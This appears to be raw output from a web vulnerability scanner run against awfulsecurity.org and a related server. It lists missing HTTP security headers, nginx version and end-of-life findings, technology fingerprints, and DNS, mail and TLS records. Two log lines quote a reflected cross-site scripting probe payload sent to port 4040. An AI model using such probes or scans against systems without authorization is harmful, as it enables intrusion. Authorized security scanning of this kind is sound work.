+[[92mhttp-missing-security-headers[0m:[1;92mx-content-type-options[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mhttp-missing-security-headers[0m:[1;92mx-permitted-cross-domain-policies[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mhttp-missing-security-headers[0m:[1;92mreferrer-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mhttp-missing-security-headers[0m:[1;92mclear-site-data[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-opener-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mhttp-missing-security-headers[0m:[1;92mpermissions-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mhttp-missing-security-headers[0m:[1;92mx-frame-options[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mhttp-missing-security-headers[0m:[1;92mcross-origin-embedder-policy[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mdefault-apache-test-all[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16 [[96m"nginx/1.24.0 (Ubuntu)"[0m]
+[[92mdefault-apache2-ubuntu-page[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mnginx-eol[0m:[1;92mversion[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16 [[96m"1.24.0"[0m]
+[[92mnginx-version[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16 [[96m"nginx/1.24.0"[0m]
+[[92mnginx-eol[0m:[1;92mversion[0m] [[94mhttp[0m] [[34minfo[0m] http://intragin.awfulsecurity.org [[96m"1.24.0"[0m]
+[[92mnginx-eol[0m:[1;92mversion[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org [[96m"1.24.0"[0m]
+[[92mnginx-version[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org [[96m"nginx/1.24.0"[0m]
+[[92mnginx-eol[0m:[1;92mversion[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16 [[96m"1.24.0"[0m]
+[[92mnginx-version[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16 [[96m"nginx/1.24.0"[0m]
+[[92mform-detection[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mform-detection[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mform-detection[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[34mINF[0m] Skipped 165.245.137.16:5050 from target list as found unresponsive permanently: cause="port closed or filtered" address=165.245.137.16:5050 chain="connection refused; got err while executing https://165.245.137.16:5050"
+[[92mtech-detect[0m:[1;92mnginx[0m] [[94mhttp[0m] [[34minfo[0m] http://165.245.137.16
+[[92mtech-detect[0m:[1;92mgoogle-font-api[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mtech-detect[0m:[1;92mnginx[0m] [[94mhttp[0m] [[34minfo[0m] https://165.245.137.16
+[[92mtech-detect[0m:[1;92mgoogle-font-api[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mtech-detect[0m:[1;92mnginx[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org
+[[92mtech-detect[0m:[1;92mgoogle-font-api[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mtech-detect[0m:[1;92mnginx[0m] [[94mhttp[0m] [[34minfo[0m] https://intragin.awfulsecurity.org/
+[[92mtech-detect[0m:[1;92mnginx[0m] [[94mhttp[0m] [[34minfo[0m] http://intragin.awfulsecurity.org
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:4040 from target list as found unresponsive permanently: cause="port closed or filtered" address=intragin.awfulsecurity.org:4040 chain="connection refused; got err while executing https://intragin.awfulsecurity.org:4040/jobs/?\"'><script>alert(document.domain)</script>"
+[[34mINF[0m] Skipped 165.245.137.16:4040 from target list as found unresponsive permanently: cause="port closed or filtered" address=165.245.137.16:4040 chain="connection refused; got err while executing https://165.245.137.16:4040/jobs/?\"'><script>alert(document.domain)</script>"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:80 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing https://www.rdap.net/domain/intragin.awfulsecurity.org"
+[[34mINF[0m] Skipped intragin.awfulsecurity.org:443 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing https://www.rdap.net/domain/intragin.awfulsecurity.org"
+[[34mINF[0m] Skipped awfulsecurity.org:80 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing https://www.rdap.net/domain/awfulsecurity.org"
+[[34mINF[0m] Skipped 165.245.137.16:80 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing https://www.rdap.net/domain/165.245.137.16"
+[[92mdnssec-detection[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org
+[[92mcaa-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org
+[[92mcaa-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org
+[[92mcaa-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] intragin.awfulsecurity.org
+[[92mssl-issuer[0m] [[94mssl[0m] [[34minfo[0m] 165.245.137.16:443 [[96m"Let's Encrypt"[0m]
+[[92mssl-dns-names[0m] [[94mssl[0m] [[34minfo[0m] 165.245.137.16:443 [[96m"intragin.awfulsecurity.org"[0m]
+[[92mssl-issuer[0m] [[94mssl[0m] [[34minfo[0m] awfulsecurity.org:443 [[96m"Let's Encrypt"[0m]
+[[92mssl-dns-names[0m] [[94mssl[0m] [[34minfo[0m] awfulsecurity.org:443 [[96m"awfulsecurity.org"[0m]
+[[92mspf-record-detect[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org [[96m"v=spf1 include:mailgun.org include:_spf.google.com ~all""[0m]
+[[92mtxt-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org [[96m""v=spf1 include:mailgun.org include:_spf.google.com ~all""[0m]
+[[92mspf-record-detect[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org [[96m"v=spf1 include:mailgun.org include:_spf.google.com ~all""[0m]
+[[92mtxt-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org [[96m""v=spf1 include:mailgun.org include:_spf.google.com ~all""[0m]
+[[92mssl-issuer[0m] [[94mssl[0m] [[34minfo[0m] intragin.awfulsecurity.org:443 [[96m"Let's Encrypt"[0m]
+[[92mssl-dns-names[0m] [[94mssl[0m] [[34minfo[0m] intragin.awfulsecurity.org:443 [[96m"intragin.awfulsecurity.org"[0m]
+[[92mdnssec-detection[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org
+[[92mnameserver-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org [[96m"ns-cloud-a4.googledomains.com."[0m,[96m"ns-cloud-a3.googledomains.com."[0m,[96m"ns-cloud-a2.googledomains.com."[0m,[96m"ns-cloud-a1.googledomains.com."[0m]
+[[92mmx-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org [[96m"1 aspmx.l.google.com."[0m,[96m"10 alt4.aspmx.l.google.com."[0m,[96m"10 mxa.mailgun.org."[0m,[96m"5 alt2.aspmx.l.google.com."[0m,[96m"10 alt3.aspmx.l.google.com."[0m,[96m"10 mxb.mailgun.org."[0m,[96m"5 alt1.aspmx.l.google.com."[0m]
+[[92mmx-service-detector[0m:[1;92mGoogle Apps[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org
+[[92mmx-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org [[96m"10 mxa.mailgun.org."[0m,[96m"10 mxb.mailgun.org."[0m,[96m"10 alt3.aspmx.l.google.com."[0m,[96m"10 alt4.aspmx.l.google.com."[0m,[96m"1 aspmx.l.google.com."[0m,[96m"5 alt1.aspmx.l.google.com."[0m,[96m"5 alt2.aspmx.l.google.com."[0m]
+[[92mmx-service-detector[0m:[1;92mGoogle Apps[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org
+[[92mnameserver-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] awfulsecurity.org [[96m"ns-cloud-a4.googledomains.com."[0m,[96m"ns-cloud-a1.googledomains.com."[0m,[96m"ns-cloud-a2.googledomains.com."[0m,[96m"ns-cloud-a3.googledomains.com."[0m]
+[[92mcaa-fingerprint[0m] [[94mdns[0m] [[34minfo[0m] intragin.awfulsecurity.org
+[[34mINF[0m] Scan completed in 27m. 127 matches found.
